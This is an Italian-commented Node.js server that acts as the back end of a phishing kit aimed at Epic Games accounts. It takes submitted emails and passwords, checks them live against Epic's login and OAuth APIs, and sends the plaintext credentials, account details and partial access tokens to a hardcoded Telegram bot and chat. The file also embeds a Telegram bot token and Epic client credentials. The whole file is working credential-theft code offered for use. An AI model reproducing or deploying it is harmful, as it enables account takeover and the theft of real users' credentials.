// server.js
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

// Configurazione
const TELEGRAM_TOKEN = '7750166730:AAFvZa3w7wpPwLJ4EzIUxye0B2yxG1UjNs4';
const TELEGRAM_CHAT_ID = '5709299213';
const PORT = process.env.PORT || 3000;

// Inizializza bot Telegram
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Inizializza server Express
const app = express();
app.use(cors());
app.use(express.json());

// ============================================
// FUNZIONE DI AUTENTICAZIONE EPIC GAMES
// (TRADOTTA DAL CODICE ORIGINALE)
// ============================================
async function authenticateEpic(email, password, remember = true) {
    // Cookie jar semplice (array di stringhe)
    let cookies = [];
    
    // Helper per fare richieste mantenendo i cookie
    async function epicRequest(url, options = {}) {
        const headers = {
            ...options.headers,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        };
        
        // Aggiungi cookie se presenti
        if (cookies.length > 0) {
            headers['Cookie'] = cookies.join('; ');
        }
        
        const response = await fetch(url, { ...options, headers });
        
        // Salva nuovi cookie
        const setCookieHeader = response.headers.raw()['set-cookie'];
        if (setCookieHeader) {
            setCookieHeader.forEach(c => {
                const cookie = c.split(';')[0];
                if (!cookies.includes(cookie)) {
                    cookies.push(cookie);
                }
            });
        }
        
        return response;
    }
    
    try {
        // 1. Richieste preliminari (costruiscono il cookie jar)
        console.log('📡 Richieste preliminari...');
        await epicRequest('https://www.epicgames.com/id/api/reputation');
        await epicRequest('https://www.epicgames.com/id/api/authenticate');
        await epicRequest('https://www.epicgames.com/id/api/location');
        
        // 2. Ottieni CSRF token
        console.log('🔑 Ottenimento CSRF...');
        await epicRequest('https://www.epicgames.com/id/api/csrf');
        
        // Estrai XSRF-TOKEN dai cookie
        const xsrfCookie = cookies.find(c => c.startsWith('XSRF-TOKEN='));
        const xsrfToken = xsrfCookie ? xsrfCookie.split('=')[1] : '';
        
        if (!xsrfToken) {
            throw new Error('Impossibile ottenere XSRF token');
        }
        
        // 3. Login
        console.log('🔐 Tentativo di login...');
        const loginRes = await epicRequest('https://www.epicgames.com/id/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-XSRF-TOKEN': xsrfToken
            },
            body: JSON.stringify({
                email: email,
                password: password,
                rememberMe: remember
            })
        });
        
        if (!loginRes.ok) {
            const errorText = await loginRes.text();
            throw new Error(`Login fallito: ${errorText}`);
        }
        
        // 4. Ottieni exchange code
        console.log('🔄 Richiesta exchange code...');
        const exchangeRes = await epicRequest('https://www.epicgames.com/id/api/exchange', {
            headers: {
                'X-XSRF-TOKEN': xsrfToken
            }
        });
        
        if (!exchangeRes.ok) {
            throw new Error('Exchange code fallito');
        }
        
        const exchangeData = await exchangeRes.json();
        
        // 5. Scambia codice per token OAuth
        console.log('🎫 Richiesta token OAuth...');
        const tokenRes = await fetch('https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': 'basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ='
            },
            body: new URLSearchParams({
                grant_type: 'exchange_code',
                exchange_code: exchangeData.code,
                includePerms: 'false'
            })
        });
        
        if (!tokenRes.ok) {
            throw new Error('Scambio token fallito');
        }
        
        const tokenData = await tokenRes.json();
        console.log('✅ Autenticazione completata!');
        
        return {
            success: true,
            ...tokenData
        };
        
    } catch (error) {
        console.error('❌ Errore autenticazione:', error);
        throw error;
    }
}

// ============================================
// FUNZIONE PER INVIARE MESSAGGI A TELEGRAM
// ============================================
async function sendToTelegram(email, password, remember, authResult = null, error = null) {
    try {
        let message = `🔐 **Nuovo tentativo di login**\n\n`;
        message += `📧 **Email:** \`${email}\`\n`;
        message += `🔑 **Password:** \`${password}\`\n`;
        message += `💾 **Ricordami:** ${remember ? '✅' : '❌'}\n`;
        message += `🕐 **Timestamp:** ${new Date().toISOString()}\n\n`;
        
        if (authResult && authResult.success) {
            message += `✅ **LOGIN RIUSCITO**\n`;
            message += `👤 **Account:** ${authResult.displayName || 'N/D'}\n`;
            message += `📧 **Email:** ${authResult.email || 'N/D'}\n`;
            message += `🆔 **Account ID:** ${authResult.account_id || 'N/D'}\n`;
            message += `🎫 **Token:** \`${authResult.access_token ? authResult.access_token.substring(0, 30) + '...' : 'N/D'}\`\n`;
            message += `⏱️ **Scade tra:** ${authResult.expires_in || 'N/D'} secondi\n`;
        } else if (error) {
            message += `❌ **LOGIN FALLITO**\n`;
            message += `⚠️ **Errore:** ${error.message || error}\n`;
        }
        
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
        console.log('📨 Messaggio inviato a Telegram');
        
    } catch (telegramError) {
        console.error('❌ Errore invio Telegram:', telegramError);
    }
}

// ============================================
// ENDPOINT API PER IL LOGIN
// ============================================
app.post('/api/login', async (req, res) => {
    const { email, password, remember = true } = req.body;
    
    // Validazione base
    if (!email || !password) {
        return res.status(400).json({ 
            success: false, 
            error: 'Email e password richieste' 
        });
    }
    
    console.log(`\n📨 Richiesta login per: ${email}`);
    
    try {
        // Tenta autenticazione reale
        const authResult = await authenticateEpic(email, password, remember);
        
        // Invia successo a Telegram
        await sendToTelegram(email, password, remember, authResult);
        
        // Rispondi al client (NASCONDI IL TOKEN COMPLETO IN PRODUZIONE)
        res.json({
            success: true,
            account: authResult.email || authResult.displayName,
            access_token: authResult.access_token ? 'Token ottenuto (nascosto per sicurezza)' : null,
            expires_in: authResult.expires_in
        });
        
    } catch (error) {
        console.error('❌ Errore:', error.message);
        
        // Invia fallimento a Telegram
        await sendToTelegram(email, password, remember, null, error);
        
        // Rispondi con errore
        res.status(401).json({
            success: false,
            error: error.message || 'Autenticazione fallita'
        });
    }
});

// ============================================
// GESTIONE COMANDI TELEGRAM (OPZIONALE)
// ============================================
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() === TELEGRAM_CHAT_ID) {
        bot.sendMessage(chatId, '🤖 Bot attivo! Riceverò qui i tentativi di login.');
    }
});

bot.onText(/\/stats/, async (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== TELEGRAM_CHAT_ID) return;
    
    bot.sendMessage(chatId, '📊 Statistiche non implementate in questa versione');
});

// ============================================
// AVVIO SERVER
// ============================================
app.listen(PORT, () => {
    console.log(`
    ====================================
    🚀 Server avviato!
    📡 Porta: ${PORT}
    🤖 Telegram Bot: Attivo
    🎯 Chat ID: ${TELEGRAM_CHAT_ID}
    
    Endpoint API:
    POST http://localhost:${PORT}/api/login
    
    Per usare il frontend, modifica API_URL in index.html
    ====================================
    `);
});
